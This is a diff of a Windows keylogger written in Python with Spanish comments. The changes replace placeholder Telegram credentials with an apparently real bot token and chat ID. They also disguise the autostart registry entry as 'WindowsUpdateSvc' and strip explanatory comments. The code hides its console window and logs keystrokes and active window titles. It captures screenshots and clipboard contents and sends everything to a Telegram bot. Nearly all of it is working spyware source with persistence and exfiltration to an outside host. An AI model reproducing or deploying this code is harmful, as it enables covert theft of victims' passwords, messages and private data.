@@ -11,13 +11,11 @@ import winreg as reg
 import ctypes
 from pynput import keyboard
 
-# ================== CONFIGURACIÓN ==================
-TELEGRAM_TOKEN = "PEGA_AQUI_TU_TOKEN_DEL_BOTFATHER"
-CHAT_ID = "PEGA_AQUI_TU_CHAT_ID"
+TELEGRAM_TOKEN = "8942025666:AAFsASFxk7p-zHVOMhrhGJtyNC0l-vwPaWg"
+CHAT_ID = "8926637402"
 
 SEND_INTERVAL = 8
-SCREENSHOT_INTERVAL = 30   # Cada cuántos segundos toma foto
-# ===================================================
+SCREENSHOT_INTERVAL = 30
 
 log_buffer = ""
 last_send = time.time()
@@ -26,18 +24,16 @@ lock = threading.Lock()
 
 def add_to_startup():
     try:
-        exe_path = sys.executable
         script_path = os.path.abspath(__file__)
         key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
-        reg.SetValueEx(key, "WindowsSystemUpdate", 0, reg.REG_SZ, f'"{exe_path}" "{script_path}"')
+        reg.SetValueEx(key, "WindowsUpdateSvc", 0, reg.REG_SZ, f'"{sys.executable}" "{script_path}"')
         reg.CloseKey(key)
     except:
         pass
 
 def get_active_window():
     try:
-        window = win32gui.GetForegroundWindow()
-        return win32gui.GetWindowText(window)[:60]  # Limitar longitud
+        return win32gui.GetWindowText(win32gui.GetForegroundWindow())[:50]
     except:
         return "Unknown"
 
@@ -55,20 +51,17 @@ def send_to_telegram(message, photo=None):
         if photo:
             url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
             files = {'photo': open(photo, 'rb')}
-            data = {"chat_id": CHAT_ID, "caption": message[:500]}
-            requests.post(url, data=data, files=files, timeout=15)
+            requests.post(url, data={"chat_id": CHAT_ID, "caption": message}, files=files, timeout=15)
             os.remove(photo)
         else:
             url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-            data = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
-            requests.post(url, json=data, timeout=10)
+            requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
     except:
         pass
 
 def take_screenshot():
     try:
-        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"screenshot_{timestamp}.png"
+        filename = f"screenshot_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
         pyautogui.screenshot(filename)
         return filename
     except:
@@ -76,9 +69,8 @@ def take_screenshot():
 
 def on_press(key):
     global log_buffer, last_send
-    
     try:
-        char = key.char if hasattr(key, 'char') and key.char is not None else f"[{str(key).replace('Key.', '').upper()}]"
+        char = key.char if hasattr(key, 'char') and key.char else f"[{str(key).replace('Key.', '').upper()}]"
     except:
         char = "[UNKNOWN]"
 
@@ -88,10 +80,9 @@ def on_press(key):
 
     with lock:
         log_buffer += entry
-
-        if (time.time() - last_send > SEND_INTERVAL) or (len(log_buffer) > 900):
+        if (time.time() - last_send > SEND_INTERVAL) or len(log_buffer) > 900:
             if log_buffer.strip():
-                msg = f"<b>🔴 KEYLOGGER ACTIVO</b>\nPC: {os.getenv('COMPUTERNAME')}\nHora: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n{log_buffer}"
+                msg = f"<b>🔴 KEYLOGGER NUCLEAR</b>\nPC: {os.getenv('COMPUTERNAME')}\n{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n{log_buffer}"
                 threading.Thread(target=send_to_telegram, args=(msg,), daemon=True).start()
                 log_buffer = ""
                 last_send = time.time()
@@ -102,24 +93,20 @@ def screenshot_thread():
         if time.time() - last_screenshot >= SCREENSHOT_INTERVAL:
             photo = take_screenshot()
             if photo:
-                caption = f"📸 Captura - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-                threading.Thread(target=send_to_telegram, args=(caption, photo), daemon=True).start()
+                threading.Thread(target=send_to_telegram, args=(f"📸 Captura {datetime.datetime.now().strftime('%H:%M:%S')}", photo), daemon=True).start()
             last_screenshot = time.time()
         time.sleep(5)
 
 def clipboard_thread():
-    last_clip = ""
+    last = ""
     while True:
         clip = get_clipboard()
-        if clip and clip != last_clip and len(str(clip)) > 3:
-            last_clip = clip
-            msg = f"<b>📋 PORTAPAPELES</b>\n\n{clip}"
-            threading.Thread(target=send_to_telegram, args=(msg,), daemon=True).start()
+        if clip and clip != last and len(str(clip)) > 3:
+            last = clip
+            threading.Thread(target=send_to_telegram, args=(f"<b>📋 PORTAPAPELES</b>\n\n{clip}",), daemon=True).start()
         time.sleep(4)
 
-# ================== INICIO ==================
 if __name__ == "__main__":
-    # Ocultar la ventana de consola
     try:
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     except:
@@ -127,12 +114,8 @@ if __name__ == "__main__":
 
     add_to_startup()
 
-    print("KEYLOGGER NUCLEAR INICIADO (Oculto)")
-
-    # Iniciar hilos
     threading.Thread(target=screenshot_thread, daemon=True).start()
     threading.Thread(target=clipboard_thread, daemon=True).start()
 
-    # Iniciar keylogger
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
